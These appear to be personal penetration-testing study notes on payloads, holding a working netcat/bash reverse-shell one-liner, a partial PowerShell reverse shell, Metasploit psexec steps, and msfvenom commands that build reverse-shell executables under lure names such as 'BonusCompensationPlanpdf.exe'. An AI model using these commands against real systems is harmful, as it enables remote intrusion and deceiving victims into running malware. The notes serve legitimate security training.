- [ ] Introduction To Payloads
Netcat/Bash Reverse Shell One-liner Explained!!!
```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

# explanation
rm -f /tmp/f; remove /tmp/f file if it exist.
mkfifo /tmp/f; make a FIFO named pipe.
cat /tmp/f | output direction.
/bin/bash -i 2>&1 | Set Shell Options
nc 10.10.14.12 7777 > /tmp/f Open a Connection with Netcat
```
PowerShell One-liner Explained!!!
```powershell
# Executes `powershell.exe` with no profile (`nop`)
powershell -nop -c
# Binding A Socket
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443); ...."
```
Payloads Take Different Shapes and Forms!!!
![[Pasted image 20250609211449.png]]
- [ ] Automating Payloads Delivery With MSF!!!
![[Pasted image 20250609211803.png]]
Practicing with Metasploit!!!
```sh
# start
msfconsole
# searh modules
search smb
56 exploit/windows/smb/psexec
id <type_of_module>/<plateform>/<service>/<tool>
# show and set selected module options
use 56
show options
set RHOSTS 10.10.10.10
# automatic payload delivery
after setting all the exploit options, we run 'exploit' or 'run' and the exploit will run to deliver ouw payload automaticaly to the target host.
```

- [ ] Crafting Payloads With msfvenom
![[Pasted image 20250609213923.png]]
Practicing with MSFvenom!!!!
```sh
# get all payload list
msfvenom -l payloads
```
![[Pasted image 20250609214500.png]]
Staged vs. Stageless Payloads!!!!
![[Pasted image 20250609214209.png]]
```sh
# linux stageless payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
# windows stageless payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
